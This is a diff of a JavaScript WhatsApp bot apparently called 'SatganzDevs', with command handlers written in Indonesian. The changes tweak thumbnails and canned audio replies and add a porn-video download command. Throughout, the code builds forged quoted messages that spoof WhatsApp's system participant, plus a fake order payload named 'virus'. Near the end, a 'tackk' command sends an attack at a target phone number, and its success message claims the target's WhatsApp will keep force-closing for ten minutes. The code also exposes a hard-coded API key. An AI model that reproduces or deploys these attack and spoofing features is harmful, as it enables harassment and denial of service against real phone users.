@@ -55,11 +55,7 @@ module.exports = SatganzDevs = async (SatganzDevs, m, chatUpdate, store) => {
         const isMedia = /image|video|sticker|audio/.test(mime)
         
 	     //Thumnail by SatganzDevs
-let gambr = global.gambar[Math.floor(Math.random() * global.gambar.length)]
-let audi = global.audio[Math.floor(Math.random() * global.audio.length)]
-const ppkul = { url : gambr }
-const thumby = { url : "https://telegra.ph/file/810bd6a113ac5df28c502.jpg" }
-const audiot = { url : audi }
+const thumby = { url : "https://zenzapis.xyz/randomanime/v2/gremory?apikey=satganzdevs" }
 const vitum= { url : global.visoka }
         // Group
         const groupMetadata = m.isGroup ? await SatganzDevs.groupMetadata(m.chat).catch(e => {}) : ''
@@ -71,11 +67,11 @@ const vitum= { url : global.visoka }
     	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
     const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 99999999,status: 200, thumbnail: thumby, surface: 200, message: `© ${global.ownername}`, orderTitle: 'Satganz Devs', sellerJid: '6281316701742@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
     const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumby}}}
-		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
+		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":100000000000,"ptt": "true"}} } 
 		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${global.ownername}`, "h": `SatganzDevs`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${global.ownername}`, 'jpegThumbnail': thumby}}}
 		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "https://chat.whatsapp.com/C2jcPPu4x4PItUFAvx1bgn","groupName": "Satganz Devs Ofc", "caption": `© ${global.ownername}`, 'jpegThumbnail': thumby}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumby}}}
-		const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumby}}}
+		const floc = {key : {participant : '6281316701742@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumby}}}
 		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumby, thumbnail: thumby,sendEphemeral: true}}}
 		const virus =  {
              key: { fromMe: false,remoteJid: "SatganzDevs@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: thumby, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
@@ -91,6 +87,8 @@ const vitum= { url : global.visoka }
 		const randomArr = (arr = []) => {
             return arr[Math.floor(Math.random() * arr.length)]
 	       }
+	const ply = async(teks) => {
+      await SatganzDevs.sendMessage(m.chat, { contextInfo: { externalAdReply: {showAdAttribution: true, title: `Hallo ${pushname}`, body: `SatganzDevs`, previewType: 'PHOTO', thumbnail: thumby, sourceUrl:`https://s.satganzdevs.repl.co`}}, text: teks, mentions: parseMention(teks)}, {quoted: floc})}
 	try {
             let isNumber = x => typeof x === 'number' && !isNaN(x)
             let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
@@ -149,6 +147,15 @@ SatganzDevs.sendReadReceipt(m.chat, m.sender, [m.key.id])
 if(!isMedia) {
 	SatganzDevs.sendReadReceipt(m.chat, m.sender, [m.key.id])
 	}
+	
+	
+	var satgnz = "allhamdulilah"
+let isnoown = new RegExp(satgnz, 'i')
+let isOwn = isnoown.test(m.text)
+ if (isOwn) {
+		let all = {url : "https://a.uguu.se/ahGderba.mp3"}
+   SatganzDevs.sendMessage(m.chat, {audio: all, mimetype:'audio/mpeg', ptt:true }, {quoted:fvn})
+   }
 	          if (isCmd) {
 let g7=["🥶","😎","🤩","🤗","😀","😃","😆","😁","😄"]
 let p = g7[Math.floor(Math.random() * g7.length)]
@@ -160,7 +167,18 @@ reactionMessage = {
                 }
                 SatganzDevs.sendMessage(m.chat, reactionMessage)
             }
-            
+             if (/^kontol|asu|asw|ngent|ngtd|anj|ajg|pler|peler|kanjut|kancut|jancok|jnck/.test(budy?.toLowerCase())) {
+		let all = {url : "https://a.uguu.se/VPsCTXyO.mp3"}
+		reactionMessage = {
+                    react: {
+                        text: `😤`,
+                        key: { remoteJid: m.chat, fromMe: false, id: quoted.id }
+                    }
+                }
+		SatganzDevs.sendMessage(m.chat, reactionMessage)
+		await sleep(1000)
+   SatganzDevs.sendMessage(m.chat, {audio: all, mimetype:'audio/mpeg', ptt:true }, {quoted:fvn})
+   }
             if (/^a(s|ss)alamu('|)alaikum$/.test(budy?.toLowerCase())) {
             const jawab_salam = [
                 'Wa\'alaikumusalam',
@@ -168,9 +186,6 @@ reactionMessage = {
                 'Wa\'alaikumusalam Warohmatulahi Wabarokatuh',
             ]
             throw m.reply(randomArr(jawab_salam))
-        }
-        if (/^kon(t|o)l$/.test(budy?.toLowerCase())) {
-        	m.reply(`h`)
         }
         // Public & Self
         if (!SatganzDevs.public) {
@@ -208,10 +223,10 @@ reactionMessage = {
 	    }
 	} 
 	//auto profil
-	if (db.data.settings[botNumber].autoprof) {
+	if (db.data.settings[botNumber].autobio) {
 	let setting = global.db.data.settings[botNumber]
 	if (new Date() * 1 - setting.status > 1000) {
-        await SatganzDevs.updateProfilePicture(botNumber, { media : { url: gambr }})
+        await SatganzDevs.updateProfilePicture(botNumber, { media : { url: thumby }})
 	    }
 	}
 	  // Anti Link
@@ -1745,7 +1760,7 @@ break
             }
             break
             case 'tes': case 'test':{
-            m.reply(`Bot On\n\n\n\n Runtime : ${runtime(process.uptime())}`)
+            ply(`Bot On\n\n\n\n Runtime : ${runtime(process.uptime())}`)
             }
             break
             case 'ebinary': {
@@ -2664,7 +2679,14 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
                     buttons: buttons,
                     headerType: 5
                 }
-                SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
+                SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: floc })
+            }
+            break
+            case 'xnxx': case 'xnxxdl': {
+	if (!text) throw 'Masukkan Query Link!'
+	m.reply(mess.wait)
+	let anu = await fetchJson(api('zenz', '/downloader/xvideos', { url: text }, 'apikey'))
+                SatganzDevs.sendMessage(m.chat, { video: { url: anu.result.files.high, caption: 'Nih bang' } }, { quoted: floc })
             }
             break
            case 'ppkul': case 'profilcool':{
@@ -2672,13 +2694,13 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
            	 let buttons = [
                     {buttonId: `.ppkul`, buttonText: {displayText: 'Next'}, type: 1}]
                 let buttonMessage = {
-                    image: { url: gambr },
+                    image: { url: thumby },
                     caption: `Created By Satganz Devs`,
                     footer: 'Press The Button Below',
                     buttons: buttons,
                     headerType: 5
                 }
-                SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
+                SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: floc })
             }
             break
             case 'tiktokwm': case 'tiktokwatermark': {
@@ -2696,7 +2718,7 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
                     buttons: buttons,
                     headerType: 5
                 }
-                SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
+                SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: floc })
             }
             break
             case 'tiktokmp3': case 'tiktokaudio': {
@@ -2713,7 +2735,7 @@ let anjay = `https://zenzapis.xyz/creator/kannagen?text=${tes1}&apikey=satganzde
                     buttons: buttons,
                     headerType: 2
                 }
-                let msg = await SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
+                let msg = await SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: floc })
                 SatganzDevs.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
             }
             break
@@ -3865,8 +3887,6 @@ Jika Ada Fitur Error Atau Bug Segera Lapor Ke Owner Bot
                         } else if (setbot.templateMsg) {
                         SatganzDevs.send5ButMsg(m.chat, anu, `© Created By Satganz Dev`, btn, { quoted : floc })
                         }
-                        await sleep(100)
-                        SatganzDevs.sendMessage(m.chat, {audio: audiot, mimetype:'audio/mpeg', ptt:true }, {quoted:fgif})
                      }
             break
             	
@@ -3874,7 +3894,7 @@ Jika Ada Fitur Error Atau Bug Segera Lapor Ke Owner Bot
             	let buttons = [
                     {buttonId: `.asupan`, buttonText: {displayText: 'Next'}, type: 1}
                 ]
-                let rnd =["https://zenzapis.xyz/randomasupan/asupan?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/asupantiktok?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/aeunicetjoaa?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/natajadeh?apikey=satganzdevs"]
+                let rnd =["https://zenzapis.xyz/randomasupan/asupan?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/asupantiktok?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/aeunicetjoaa?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/natajadeh?apikey=satganzdevs","https://zenzapis.xyz/randomasupan/asupantiktok?apikey=satganzdevs"]
          let randvid = rnd[Math.floor(Math.random() * rnd.length)]
             	let buttonMessage = {
                     video: { url: randvid },
@@ -3906,7 +3926,7 @@ let orang = text.split("|")[1]
 let pesann = text.split("|")[2]
 let butt =[{ buttonId: `markread ${pushname}|${bebek}|Congrats \n${pk}/${orang} Read Your Message!!`, buttonText: { displayText: 'Tandai Telah Di Baca' }, type: 1 }]
 rply(`Sending Message : ${pesann} To : ${orang} From : ${frome}`)
-	await SatganzDevs.sendButtonText(`${kont}@s.whatsapp.net`, butt, pesann,`Message From : ${frome}`, m)
+	await SatganzDevs.sendButtonText(`${orang}@s.whatsapp.net`, butt, pesann,`Message From : ${frome}`, m)
 }
 rply('Success')
 break
@@ -3946,8 +3966,7 @@ break
 case 'carbon':{
 	if (!text) throw m.reply('Input text')
 	let res = await fetchJson(`https://api-rull.herokuapp.com/api/cmd?code=${q}`)
-	if (res.status !== 200) throw m.reply(`To long!`)
-	SatganzDevs.sendMessage(m.chat, { image: { url: res.url }}, { quoted: fgclink })
+	SatganzDevs.sendMessage(m.chat, { image: { url: res.url }}, { quoted: floc })
 	}
 	break
 	 case 'sewabot': case 'rent': case 'sewa': case 'donate': case 'donation': case 'donasi': case 'donet':{
@@ -4006,7 +4025,7 @@ serang(nomore)
 		break
 		case 'tackk':{
 		nomore = q + "@s.whatsapp.net"
-m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 10 menit`)
+ply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 10 menit`)
 await sleep(600000)
 serang(nomore)
 		}
